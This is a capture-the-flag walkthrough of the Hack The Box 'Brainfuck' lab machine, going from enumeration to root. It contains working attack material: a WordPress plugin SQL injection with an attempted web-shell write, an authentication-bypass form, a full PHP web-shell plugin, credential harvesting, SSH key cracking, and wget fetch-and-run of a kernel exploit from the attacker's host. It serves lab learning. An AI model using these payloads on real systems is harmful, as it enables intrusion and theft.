# [Brainfuck](https://app.hackthebox.eu/machines/17)

Start off with `nmap`:

```bash
sudo nmap -sS -sC -p1-65535      --open -Pn -sV 10.10.10.17 # TCP deep scan 
sudo nmap -sS -sC --top-ports=20 --open -Pn -sV 10.10.10.17 # TCP quick scan
sudo nmap -sU -sC --top-ports=20 --open -Pn     10.10.10.17 # UDP quick scan
```

The quick scan returns with the following:

![nmap](./brainfuck/nmap.png)

Start the following website scans in the background:

```bash
dirb https://10.10.10.17 -r
nikto -h https://10.10.10.17 --maxtime=30s
```

Looking at the website manually shows the following:

![website](./brainfuck/website.png)

The website looks very basic and the output (or lack thereof) from `dirb` and `nikto` verify that. There are quite a few mail service ports open in the `nmap` scans:

- 25 SMTP (https://book.hacktricks.xyz/pentesting/pentesting-smtp)
- 110/995 POP3 (https://book.hacktricks.xyz/pentesting/pentesting-pop)
- 143/993 IMAP (https://book.hacktricks.xyz/pentesting/pentesting-imap)

Trying to get version information with `nmap` shows the following:

```bash
sudo nmap -sS -sC -sV -p 25,110,143 -Pn 10.10.10.17
```

![nmap_mail](./brainfuck/nmap_mail.png)

So the mail services are Dovecot and Postfix but no version info from basic banner grabbing... Not much to go on here so deeper scans of the services are needed. Starting with the HTTPS service:

```bash
sudo nmap --script "ssl*" -Pn -p 443 -sV 10.10.10.17
```

While that runs, a manual inspection of server headers shows the following:

![http_headers](./brainfuck/http_headers.png)

Okay, so that is one version tied to a service. However, there are no results from `searchsploit` for this version and no public CVEs that provide remote code execution or information leakage:

- https://www.cvedetails.com/vulnerability-list/vendor_id-10048/product_id-17956/version_id-198730/Nginx-Nginx-1.10.0.html

From the output of the deeper `nmap` scan comes the following interesting output:

![nmap_https](./brainfuck/nmap_https.png)

So there is weak RSA encryption used here? Take a look at the SSL/TLS certification:

```bash
echo -n | openssl s_client -connect 10.10.10.17:443
```

Interestingly, there is an email address in the certificate chain:

![openssl_email](./brainfuck/openssl_email.png)

It is possible to verify this username exists on the target by using the open SMTP service and one of 3 commands:

- https://www.hackingarticles.in/4-ways-smtp-enumeration/

```bash
# method 1:
MAIL FROM:<username>
RCPT TO:<username>
# method 2:
VRFY <username>
# method 3:
EXPN <username>
```

![smtp](./brainfuck/smtp.png)

So the user `orestis` exists! Going to the website referenced in the `nmap` notice above (https://weakdh.org/) it states the following:

> Websites that use one of a few commonly shared 1024-bit Diffie-Hellman groups may be susceptible to                passive eavesdropping from an attacker with nation-state resources.

Welp this is not a nation-state attack :rofl: so this is likely a dead end... Looking at the SSH service more closely it seems to be allowing only `publickey` authentication (no passwords):

```bash
sudo nmap --script "ssh*" -Pn -p 22 -sV 10.10.10.17
```

![nmap_ssh](./brainfuck/nmap_ssh.png)

The deeper `nmap` scan shows all the supported encryption algorithms and there are no obvious weak ones like `arcfour` or just RC4. A better tool can be used to check for weak combinations:

- https://blog.gdssecurity.com/labs/2015/8/3/ssh-weak-diffie-hellman-group-identification-tool.html
- https://github.com/AonCyberLabs/SSH-Weak-DH

```bash
# install docker
sudo apt update
sudo apt install -y docker.io
sudo systemctl enable docker --now
sudo usermod -aG docker $USER # requires a logout and login to work
git clone https://github.com/AonCyberLabs/SSH-Weak-DH.git
cd SSH-Weak-DH
docker build -t ssh-weak-dh .
docker run --rm -v "$(pwd)/logs/":/logs/ ssh-weak-dh 10.10.10.17 22
```

![ssh_ssl](./brainfuck/ssh_ssl.png)

Welp, the output of the scan also does not reveal any vulnerabilities... There is still further information in the SSL cert by looking at the x509 certificate embedded in the SSL/TLS request:

```bash
echo -n | openssl s_client -connect 10.10.10.17:443 | sed -ne '/-BEGIN CERTIFICATE-/,/-END CERTIFICATE-/p' > brainfuck.pem
openssl x509 -in brainfuck.pem -noout -text
```

![x509](./brainfuck/x509.png)

In the x509 extensions dump for the server certificate, there are some interesting DNS entries. These were also found from the original `nmap` scan :disappointed: ...

- `https://brainfuck.htb` (a good idea to add just in case)
- `https://www.brainfuck.htb`
- `https://sup3rs3cr3t.brainfuck.htb`

Adding these to `/etc/hosts` and browsing to them shows the following WordPress webpage for `https://www.brainfuck.htb` and `https://brainfuck.htb`:

![website_www](./brainfuck/website_www.png)

And the following for `https://sup3rs3cr3t.brainfuck.htb`:

![website_secret](./brainfuck/website_secret.png)

Spin up the following scans in the background:

- Including `wpscan` since the webiste at `https://brainfuck.htb` is running WordPress:

```bash
dirb https://www.brainfuck.htb -r
dirb https://sup3rs3cr3t.brainfuck.htb -r
nikto -h https://www.brainfuck.htb --maxtime=30s
nikto -h https://sup3rs3cr3t.brainfuck.htb --maxtime=30s
wpscan --url https://brainfuck.htb --enumerate ap,at,cb,dbe --disable-tls-checks
```

The `wpscan` returns interesting results in the plugins section:

![wpscan](./brainfuck/wpscan.png)

This plugin is out of date and `searchsploit` returns some interesting results that match the target's version 7.1.3:

![searchsploit_ticket](./brainfuck/searchsploit_ticket.png)

Looking at 40939 first, it describes an SQL injection published here:

- https://lenonleite.com.br/en/2016/12/13/wp-support-plus-responsive-ticket-system-wordpress-plugin-sql-injection/

The PoC is a simple HTML form which sends an HTTP POST to a vulnerable PHP file. Setting this up for the target becomes the following:

```html
<form action="https://www.brainfuck.htb/wp-admin/admin-ajax.php" method="post">
	<input type="text" name="action" value="wpsp_getCatName">
	<input type="text" name="cat_id" value="0 UNION SELECT 1,user(),3">
	<input type="submit" name="">
</form>
```

The `cat_id` field has been modified to output the user running the database. The original exploit thinks this this is column #2 so it is best to test that before moving on:

![sql_injection](./brainfuck/sql_injection.png)

This outputs `orestis@localhost` so that is valid SQL injection. However, the attack is limited due to the actual PHP source of the query:

- https://plugins.trac.wordpress.org/browser/wp-support-plus-responsive-ticket-system/trunk/includes/admin/wpsp_getCatName.php?rev=1546225

```php
<?php
  if ( ! defined( 'ABSPATH' ) ) exit; // Exit if accessed directly
  global $wpdb;
  $category = $wpdb->get_row(
    "SELECT * FROM {$wpdb->prefix}wpsp_catagories where id=".$_POST['cat_id']);
  echo stripcslashes($category->name);
?>
```

The object returned by `get_row()` must have a `name` field for it to be displayed. Trying to create a PHP shell with the following did not work so `orestis` may not have the right privileges? Moving on...

```sql
0 UNION SELECT 1,"<?php echo shell_exec($_GET['cmd']);?>",3 INTO OUTFILE '/var/www/html/wp-content/plugins/wp-support-plus-responsive-ticket-system/includes/admin/bubba.php'
```

Looking at exploit 41006, it describes a vulnerability allowing for any user to login as any other user just by knowing the username:

- https://security.szurek.pl/en/wp-support-plus-responsive-ticket-system-713-privilege-escalation.html

For this to work, a list of valid usernames is needed. `wpscan` can help here:

```bash
wpscan --url https://brainfuck.htb --disable-tls-checks --enumerate u
```

This returns the following users:

- `admin`
- `administrator`

![wpscan_users](./brainfuck/wpscan_users.png)

Creating the HTML form with the following sets up the payload:

```html
<form method="post" action="https://brainfuck.htb/wp-admin/admin-ajax.php">
	Username: <input type="text" name="username" value="">
	<input type="hidden" name="email" value="sth">
	<input type="hidden" name="action" value="loginGuestFacebook">
	<input type="submit" value="Login">
</form>
```

Trying the user `administrator`, clicking the "Login" button, and browsing to the page `https://brainfuck.htb/wp-admin/index.php` shows the following instead of the normal WordPress login page:

![administrator](./brainfuck/administrator.png)

Looking at the left side menu, this user does not have many privileges. Logout of the `administrator` account and use the HTML form from exploit 41006 to login as the `admin` user:

![admin](./brainfuck/admin.png)

Now this user has higher privileges! With this access, it is possible to upload & activate a WordPress plugin that will provide remote command execution:

- https://github.com/danielmiessler/SecLists/blob/master/Web-Shells/WordPress/plugin-shell.php

```php
<?php
/*
 * Plugin Name: bubba
 */
if (isset($_REQUEST['cmd'])) {
  $cmd = $_REQUEST['cmd'];
  executeCommand($cmd);
  die();
}

function executeCommand(string $command) {
  # Try to find a way to run our command using various PHP internals
  if (class_exists('ReflectionFunction')) {
    # http://php.net/manual/en/class.reflectionfunction.php
    $function = new ReflectionFunction('system');
    $function->invoke($command);
  } elseif (function_exists('call_user_func_array')) {
    # http://php.net/manual/en/function.call-user-func-array.php
    call_user_func_array('system', array($command));
  } elseif (function_exists('call_user_func')) {
    # http://php.net/manual/en/function.call-user-func.php
    call_user_func('system', $command);
  } else if(function_exists('passthru')) {
    # https://www.php.net/manual/en/function.passthru.php
    ob_start();
    passthru($command , $return_var);
    $output = ob_get_contents();
    ob_end_clean();
  } else if(function_exists('system')){
    # this is the last resort. chances are PHP Suhosin
    # has system() on a blacklist anyways :>

    # http://php.net/manual/en/function.system.php
    system($command);
  }
}
?>
```

Save this above code as `bubba.php` and make it into a WordPress plugin by packaging the plugin in a zip file. When WordPress receives the zip file, it will extract it into the `wp-content/plugins` directory. Also, WordPress places the contents of the zip file into a folder that matches the name of the zip file itself with a `-1` appended to the end.

- Plugins require certain PHP comments to be considered valid: https://developer.wordpress.org/plugins/plugin-basics/header-requirements/

```bash
zip bubba.zip bubba.php
```

With this ZIP, go to Plugins > Add New > Upload Plugin > Browse > Install Now > Activate Plugin. However, the process hangs on browsing to `https://brainfuck.htb/wp-admin/plugin-install.php`. This may be due to the exploit only giving access to `https://brainfuck.htb/wp-admin/index.php`? Better to change the password of the `admin` user and login in directly. Do this by clicking on `Howdy,admin` in the top right corner > Edit My Profile and changing the password at the bottom:

![admin_password](./brainfuck/admin_password.png)

After logging out and back in with the new password, repeat the steps to install the plugin. However, now there is a new error:

![plugin_error](./brainfuck/plugin_error.png)

This seems to be locked down by the application... Looking at the other plugins, there is one called `Easy SMTP`. Viewing its settings shows the following page:

![smtp_plugin](./brainfuck/smtp_plugin.png)

The password field can be found by inspecting the HTML source:

![smtp_password](./brainfuck/smtp_password.png)

So valid SMTP credentials are  `orestis/kHGuERB29DNiNE`. Trying them out for SMTP does not work since the SMTP server does not support the `AUTH LOGIN` command from its output of `EHLO`:

- https://www.samlogic.net/articles/smtp-commands-reference.htm

![no_auth_login](./brainfuck/no_auth_login.png)

However trying these credentials on the POP or IMAP services generates a valid login:

- https://www.atmail.com/blog/imap-101-manual-imap-sessions/
- https://www.atmail.com/blog/pop-101-manual-pop-sessions/

![imap_login](./brainfuck/imap_login.png)

![pop3_login](./brainfuck/pop3_login.png)

Logging in via POP3 and enumerating the user's mailbox shows the following interesting email:

```bash
USER orestis        # specify login username
PASS kHGuERB29DNiNE # specify login password
STAT                # list total number of emails and their combined size
LIST                # list size of of each email
RETR <X>            # get content of email <X>
```

![secret_password](./brainfuck/secret_password.png)

Okay, so now thats another credential `orestis/kIEnnfEKJ#9UmdO` for the forum at `https://sup3rs3cr3t.brainfuck.htb` that we got from the SSL/TLS cert.  Logging in with these credentials shows the following:

![forum](./brainfuck/forum.png)

The `SSH Access` thread talks about opening an "encrypted" thread so the `admin` user can post the SSH key for `orestis`. Looking at the `Key` thread shows the following:

![key](./brainfuck/key.png)

This looks like a simple [Caesar Cipher](https://en.wikipedia.org/wiki/Caesar_cipher) because the numbers/symbols are not changed but all the letters are. However, it is not that simple because the following text should likely be a URL starting with `https` and with a simple Caesar Cipher, it would have the same letter for the `t` in `https`. Therefore, it is likely a [Vigenère cipher](https://en.wikipedia.org/wiki/Vigen%C3%A8re_cipher):

- `mnvze://10.10.10.17/8zb5ra10m915218697q1h658wfoq0zc8/frmfycu/sp_ptr`

The key to breaking the cipher is recognizing that `orestis` always signs his posts with the following text:

- `Orestis - Hacking for fun and profit`

Taking the ciphertext for that signature and using the known plaintext of the signature will leak the key used to encode the messages. As long as the key is less than the length of the known plaintext, then the entire key can be leaked. Using [CyberChef](https://gchq.github.io/CyberChef/#recipe=Vigen%C3%A8re_Decode('OrestisHackingforfunandprofit')&input=V2VqbXZzZSAtIEZidGtxYWwgenFiIHJzbyBybmwgY3dpaHNm), the following change is seen:

- `Wejmvse - Fbtkqal zqb rso rnl cwihsf` becomes `Infuckm - Ybrainf uck myb rai nfuckm`

Assuming a key of `fuckmybrain` the following message with the URL is decoded:

```
There you go you stupid fuck, I hope you remember your key password because I dont :)

https://10.10.10.17/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa
```

Browsing to that URL returns the following private key:

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,6904FEF19397786F75BE2D7762AE7382

mneag/YCY8AB+OLdrgtyKqnrdTHwmpWGTNW9pfhHsNz8CfGdAxgchUaHeoTj/rh/
B2nS4+9CYBK8IR3Vt5Fo7PoWBCjAAwWYlx+cK0w1DXqa3A+BLlsSI0Kws9jea6Gi
W1ma/V7WoJJ+V4JNI7ufThQyOEUO76PlYNRM9UEF8MANQmJK37Md9Ezu53wJpUqZ
7dKcg6AM/o9VhOlpiX7SINT9dRKaKevOjopRbyEFMliP01H7ZlahWPdRRmfCXSmQ
zxH9I2lGIQTtRRA3rFktLpNedNPuZQCSswUec7eVVt2mc2Zv9PM9lCTJuRSzzVum
oz3XEnhaGmP1jmMoVBWiD+2RrnL6wnz9kssV+tgCV0mD97WS+1ydWEPeCph06Mem
dLR2L1uvBGJev8i9hP3thp1owvM8HgidyfMC2vOBvXbcAA3bDKvR4jsz2obf5AF+
Fvt6pmMuix8hbipP112Us54yTv/hyC+M5g1hWUuj5y4xovgr0LLfI2pGe+Fv5lXT
mcznc1ZqDY5lrlmWzTvsW7h7rm9LKgEiHn9gGgqiOlRKn5FUl+DlfaAMHWiYUKYs
LSMVvDI6w88gZb102KD2k4NV0P6OdXICJAMEa1mSOk/LS/mLO4e0N3wEX+NtgVbq
ul9guSlobasIX5DkAcY+ER3j+/YefpyEnYs+/tfTT1oM+BR3TVSlJcOrvNmrIy59
krKVtulxAejVQzxImWOUDYC947TXu9BAsh0MLoKtpIRL3Hcbu+vi9L5nn5LkhO/V
gdMyOyATor7Amu2xb93OO55XKkB1liw2rlWg6sBpXM1WUgoMQW50Keo6O0jzeGfA
VwmM72XbaugmhKW25q/46/yL4VMKuDyHL5Hc+Ov5v3bQ908p+Urf04dpvj9SjBzn
schqozogcC1UfJcCm6cl+967GFBa3rD5YDp3x2xyIV9SQdwGvH0ZIcp0dKKkMVZt
UX8hTqv1ROR4Ck8G1zM6Wc4QqH6DUqGi3tr7nYwy7wx1JJ6WRhpyWdL+su8f96Kn
F7gwZLtVP87d8R3uAERZnxFO9MuOZU2+PEnDXdSCSMv3qX9FvPYY3OPKbsxiAy+M
wZezLNip80XmcVJwGUYsdn+iB/UPMddX12J30YUbtw/R34TQiRFUhWLTFrmOaLab
Iql5L+0JEbeZ9O56DaXFqP3gXhMx8xBKUQax2exoTreoxCI57axBQBqThEg/HTCy
IQPmHW36mxtc+IlMDExdLHWD7mnNuIdShiAR6bXYYSM3E725fzLE1MFu45VkHDiF
mxy9EVQ+v49kg4yFwUNPPbsOppKc7gJWpS1Y/i+rDKg8ZNV3TIb5TAqIqQRgZqpP
CvfPRpmLURQnvly89XX97JGJRSGJhbACqUMZnfwFpxZ8aPsVwsoXRyuub43a7GtF
9DiyCbhGuF2zYcmKjR5EOOT7HsgqQIcAOMIW55q2FJpqH1+PU8eIfFzkhUY0qoGS
EBFkZuCPyujYOTyvQZewyd+ax73HOI7ZHoy8CxDkjSbIXyALyAa7Ip3agdtOPnmi
6hD+jxvbpxFg8igdtZlh9PsfIgkNZK8RqnPymAPCyvRm8c7vZFH4SwQgD5FXTwGQ
-----END RSA PRIVATE KEY-----
```

This key is encrypted with a password, but that can be cracked using `john`. First the SSH key must be converted into a format that can be parsed by john using `ssh2john.py`, which is found along with the other format converters in `/usr/share/john`. 

```bash
# download the encrypted private key
wget https://10.10.10.17/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa \
	-P . -O id_rsa --no-check-certificate
# convert it into a john format
/usr/share/john/ssh2john.py id_rsa > id_rsa.hash
# prepare the wordlist for john
cp /usr/share/wordlists/rockyou.txt.gz .
gunzip rockyou.txt.gz
# crack the key
john --wordlist=rockyou.txt id_rsa.hash
```

![john](./brainfuck/john.png)

Looks like the password is `3poulakia!`. Test this by trying to login by SSH as `orestis`:

```bash
# "protect" the private key so SSH does not complain
chmod 600 id_rsa
# use it authenticate
ssh -i ./id_rsa orestis@10.10.10.17
# find user.txt
find / -iname user.txt -exec ls -lad {} \; 2>/dev/null
```

![user](./brainfuck/user.png)

Nice! that is `user.txt`. During enumeration, there is an interesting file at `/home/orestis/encrypt.sage`:

```python
nbits = 1024

password = open("/root/root.txt").read().strip()
enc_pass = open("output.txt","w")
debug = open("debug.txt","w")
m = Integer(int(password.encode('hex'),16))

p = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)
q = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)
n = p*q
phi = (p-1)*(q-1)
e = ZZ.random_element(phi)
while gcd(e, phi) != 1:
    e = ZZ.random_element(phi)

c = pow(m, e, n)
enc_pass.write('Encrypted Password: '+str(c)+'\n')
debug.write(str(p)+'\n')
debug.write(str(q)+'\n')
debug.write(str(e)+'\n')
```

It opens `/root/root.txt` and encrypts it into the file `output.txt` which has the following contents:

```
Encrypted Password: 44641914821074071930297814589851746700593470770417111804648920018396305246956127337150936081144106405284134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182
```

The script seems to be doing [RSA encryption](https://simple.wikipedia.org/wiki/RSA_algorithm) by hand:

1. Choose two different large random prime numbers `p` and `q` 

   - Script is using 1024 bits for the large random prime numbers

2. Calculate `n = p * q` 

   - `n` is the modulus for the public key and the private keys

3. Calculate the [totient](https://simple.wikipedia.org/wiki/Totient): `t = (p − 1) * (q − 1) ` 

4. Choose an [integer](https://simple.wikipedia.org/wiki/Integer) `e` such that `1 < e < t` and `e` is [co-prime](https://simple.wikipedia.org/wiki/Coprime) to `t`. Co-prime means `e` and `t` share no factors other than `GCD(e, t) = 1`

   - `GCD()` is [Greatest Common Factor](https://simple.wikipedia.org/wiki/Gcd)
   - `e` is the public exponent in the public key

5. Encrypt a message `m` with `c = (m ^ e) mod n`

   - `mod` is the modulus operator (https://www.w3schools.com/python/ref_func_pow.asp)

6. Decrypting the message can be done by `m = (c ^ d) mod n` where integer `d`  satisfies the [congruence relation](https://simple.wikipedia.org/wiki/Modular_arithmetic#The_congruence_relation) `(d * e) ~ 1 mod t` for some integer `x`

   - `d` is known as the modular inverse
     - https://dusty.phillips.codes/2018/09/13/an-intermediate-guide-to-rsa/

   - `d` is kept as the private key exponent

 `debug.txt` contains `p`, `q`, and `e`, which makes this just a math problem:

```
7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307
7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079
30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997
```

Cracking the plaintext can be done with the following Python:

```python
import sympy

# from debug.txt
p = 7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307
q = 7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079
e = 30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997
# from output.txt
ciphertext = 44641914821074071930297814589851746700593470770417111804648920018396305246956127337150936081144106405284134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182
# compute n
n = p * q
# compute t
t = (p - 1) * (q - 1)
# compute d 
# https://docs.sympy.org/latest/modules/core.html#sympy.core.numbers.mod_inverse
d = sympy.core.numbers.mod_inverse(e, t)
# decrypt ciphertext
plaintext = pow(ciphertext, d, n)
# convert binary data to ascii
flag = bytes.fromhex(hex(plaintext).lstrip('0x')).decode('utf-8')
print("plaintext: " + flag)
```

Installing libraries and running the above script as `root.py` can be done as follows:

```bash
curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py
python3 get-pip.py
python3 -m pip install sympy
python3 root.py 
```

This returns the flag from `/root/root.txt`:

![root_flag](./brainfuck/root_flag.png)

However, this really isn't root... Looking for a kernel exploit based on the target version has some promising results:

![kernel_version](./brainfuck/kernel_version.png)

![searchsploit_kernel](./brainfuck/searchsploit_kernel.png)

Looking at 45010, it does not list the exact target kernel version, but it lists kernel versions before and after it so it is likely to work:

```
Tested on Ubuntu 16.04 with the following Kernels
4.4.0-31-generic
4.4.0-62-generic
4.4.0-81-generic
4.4.0-116-generic
4.8.0-58-generic
4.10.0.42-generic
4.13.0-21-generic
```

Compile and send over to the target:

```bash
# on kali
searchsploit -m 45010
gcc 45010.c -o 45010
python3 -m http.server 8080
# on target
wget http://10.10.14.23:8080/45010
chmod +x 45010 && ./45010
```

Now that is actual `root`:

![root](./brainfuck/root.png)

